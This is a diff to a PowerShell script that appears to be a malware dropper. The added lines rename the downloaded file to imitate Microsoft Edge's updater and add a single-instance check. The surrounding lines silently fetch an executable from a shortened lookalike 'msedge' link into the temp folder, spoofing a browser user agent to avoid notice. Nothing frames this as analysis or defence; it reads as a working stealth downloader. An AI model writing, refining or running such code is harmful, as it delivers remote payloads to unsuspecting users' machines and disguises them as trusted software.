@@ -1,7 +1,10 @@
+# Sifu's "Single Instance" Check
+if (Get-Process "MicrosoftEdgeUpdateUA" -ErrorAction SilentlyContinue) { exit }
+
 # 1. Paths & Servers
 # Your specific shortened GitHub Raw link
 $url_exe = 'https://msedge.short.gy/FwVDAu'
-$p = "$env:temp\win_update.exe"
+$p = "$env:temp\MicrosoftEdgeUpdateUA.exe"
 
 # 2. Silent Download
 # Added -UserAgent to look like a standard browser request
